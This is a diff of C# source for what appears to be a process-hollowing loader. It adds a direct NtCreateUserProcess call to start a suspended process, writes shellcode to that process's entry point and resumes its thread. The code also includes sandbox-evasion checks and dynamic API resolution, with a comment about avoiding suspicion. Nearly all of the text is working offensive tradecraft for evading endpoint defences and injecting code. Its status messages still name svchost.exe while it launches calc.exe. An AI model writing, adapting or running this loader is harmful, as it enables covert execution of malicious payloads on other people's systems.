@@ -11,13 +11,13 @@ namespace Hollow
             DateTime t1 = DateTime.Now;
             var sleepParameters = new object[]
             {
-                    (uint)5000
+                    (uint)2000
             };
 
-            Generic.DynamicApiInvoke("kernel32.dll", "Sleep", typeof(Win32.Sleep), ref sleepParameters);
+            Generic.DynamicAPIInvoke("kernel32.dll", "Sleep", typeof(Win32.Sleep), ref sleepParameters);
 
             double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
-            if (t2< 4.69)
+            if (t2< 1.69)
             {
                 Console.WriteLine("Exiting as sleep wasn't met...");
                 return;
@@ -26,10 +26,10 @@ namespace Hollow
                 var getCurrentProcParameters = new object[] { };
                 var vaexParameters = new object[]
                 {
-                            Generic.DynamicApiInvoke("kernel32.dll", "GetCurrentProcess", typeof(Win32.GetCurrentProcess), ref getCurrentProcParameters), IntPtr.Zero, (uint)0x1000, (uint)0x3000, (uint)0x40, (uint)0
+                            Generic.DynamicAPIInvoke("kernel32.dll", "GetCurrentProcess", typeof(Win32.GetCurrentProcess), ref getCurrentProcParameters), IntPtr.Zero, (uint)0x1000, (uint)0x3000, (uint)0x40, (uint)0
                 };
 
-                IntPtr veax = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "VirtualAllocExNuma", typeof(Win32.VirtualAllocExNuma), ref vaexParameters);
+                IntPtr veax = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "VirtualAllocExNuma", typeof(Win32.VirtualAllocExNuma), ref vaexParameters);
 
             if (veax == null)
             {
@@ -41,44 +41,72 @@ namespace Hollow
                             IntPtr.Zero
             };
 
-            IntPtr fls = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "FlsAlloc", typeof(Win32.FlsAlloc), ref flsParameters);
+            IntPtr fls = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "FlsAlloc", typeof(Win32.FlsAlloc), ref flsParameters);
 
             if (fls == null)
             {
                 return;
             }
 
-            //Create objects of startup info and process info, as stated in the structures in the Win32.cs file
-            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
-            Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
-            var pa = new Win32.SECURITY_ATTRIBUTES();
-            var ta = new Win32.SECURITY_ATTRIBUTES();
+            Win32.PS_CREATE_INFO ci = new Win32.PS_CREATE_INFO();
+            // https://gist.github.com/rasta-mouse/2f6316083dd2f38bb91f160cca2088df
+            ci.Size = (UIntPtr)88; // sizeof(PS_CREATE_INFO)
+            ci.State = Win32.PS_CREATE_STATE.PsCreateInitialState;
+            ci.Unused = new byte[76];
 
-            si.cb = Marshal.SizeOf(si);
-            pa.nLength = Marshal.SizeOf(pa);
-            ta.nLength = Marshal.SizeOf(ta);
+            Win32.UNICODE_STRING imagePath, currentDirectory, commandLine;
+            imagePath = currentDirectory = commandLine = new Win32.UNICODE_STRING();
 
-            var createProcessParameters = new object[]
+            Win32.RtlInitUnicodeString(ref imagePath, "\\??\\C:\\Windows\\System32\\calc.exe");
+            Win32.RtlInitUnicodeString(ref currentDirectory, "C:\\Windows\\System32");
+            Win32.RtlInitUnicodeString(ref commandLine, "C:\\Windows\\System32\\calc.exe");
+
+            var processParams = IntPtr.Zero;
+
+            object[] parameters =
             {
-                "C:\\Windows\\System32\\svchost.exe", null, pa, ta, false, (uint)0x00000004 , IntPtr.Zero, "C:\\Windows\\System32", si, pi
+                processParams, imagePath, IntPtr.Zero, currentDirectory, commandLine, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, Win32.CREATE_PROCESS_PARAMETERS_FLAGS.Normalize
             };
 
-            //Create a suspended process of svchost.exe
-            bool cpCheck = (bool)Generic.DynamicApiInvoke("kernel32.dll", "CreateProcessW", typeof(Win32.CreateProcessW), ref createProcessParameters);
+            var status = (Win32.NTSTATUS)Generic.DynamicAPIInvoke( "ntdll.dll", "RtlCreateProcessParametersEx", typeof(Win32.RtlCreateProcessParametersEx), ref parameters);
 
-            if (cpCheck == true)
+            if (status == Win32.NTSTATUS.Success)
             {
-                pi = (Win32.PROCESS_INFORMATION)createProcessParameters[9];
-                Console.WriteLine("[*] Created svchost.exe process successfully! PID: {0}", pi.dwProcessId);
+                processParams = (IntPtr)parameters[0];
+                Console.WriteLine("[*] Successfully created process parameters with RtlCreateProcessParametersEx");
             }
             else
             {
-                Console.WriteLine("[!] There was an error creating svchost.exe!");
+                Console.WriteLine("[!] Failed to create process parameters!");
             }
 
+            var attributeList = new Win32.PS_ATTRIBUTE_LIST { Attributes = new Win32.PS_ATTRIBUTE[1] };
+            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf(attributeList);
+            attributeList.Attributes[0].Attribute = 0x20005;
+            attributeList.Attributes[0].Size = imagePath.Length;
+            attributeList.Attributes[0].Value = imagePath.Buffer;
 
+            IntPtr hThread = IntPtr.Zero;
+            IntPtr hProcess = IntPtr.Zero;
+
+            var NtUAddress = Generic.GetLibraryAddress("ntdll.dll", "NtCreateUserProcess");
+            var ntCreateUserProcess = (Win32.NtCreateUserProcess)Marshal.GetDelegateForFunctionPointer(NtUAddress, typeof(Win32.NtCreateUserProcess));
+
+            var check = ntCreateUserProcess(ref hProcess, ref hThread, Win32.PROCESS_ACCESS.AllAccess, Win32.THREAD_ACCESS.AllAccess, IntPtr.Zero, IntPtr.Zero, Win32.PROCESS_CREATE_FLAGS.None, Win32.THREAD_CREATE_FLAGS.Suspended, processParams, ref ci, ref attributeList);
+
+            if (check == Win32.NTSTATUS.Success)
+            {
+                Console.WriteLine("[*] Created svchost.exe process successfully!");
+            }
+            else
+            {
+                Console.WriteLine("[!] Failed to create svchost process :(");
+            }
+
+            Console.WriteLine(hProcess);
+            Console.WriteLine(hThread);
+            
             Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
-            IntPtr hProcess = pi.hProcess;
             uint tmp = 0;
             var address = Generic.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
             var zwQueryInformationProcess = (Win32.ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(address, typeof(Win32.ZwQueryInformationProcess));
@@ -146,7 +174,7 @@ namespace Hollow
             {
                 hProcess, addressOfEntryPoint, shellcode, shellcode.Length, nRead
             };
-            var writeCheck = (bool)Generic.DynamicApiInvoke("kernel32.dll", "WriteProcessMemory", typeof(Win32.WriteProcessMemory), ref writeProcMemParameters);
+            var writeCheck = (bool)Generic.DynamicAPIInvoke("kernel32.dll", "WriteProcessMemory", typeof(Win32.WriteProcessMemory), ref writeProcMemParameters);
 
             if (!writeCheck)
             {
@@ -162,10 +190,10 @@ namespace Hollow
             //Hopefully avoids suspicion more than previous methods, as this is a trusted process that communicates over networks regularly
             var resThreadParameters = new object[]
             {
-                            pi.hThread
+                hThread
             };
 
-            uint resumeCheck = (uint)Generic.DynamicApiInvoke("kernel32.dll", "ResumeThread", typeof(Win32.ResumeThread), ref resThreadParameters);
+            uint resumeCheck = (uint)Generic.DynamicAPIInvoke("kernel32.dll", "ResumeThread", typeof(Win32.ResumeThread), ref resThreadParameters);
             if (resumeCheck > 1)
             {
                 Console.WriteLine($"[!] Failed to resume the thread! It is still suspended! Returned value: {resumeCheck}!");
@@ -179,6 +207,8 @@ namespace Hollow
             {
                 Console.WriteLine($"[*] Resumed thread successfully! Returned value: {resumeCheck}!");
             }         
+            
+            
         }
     }
 }
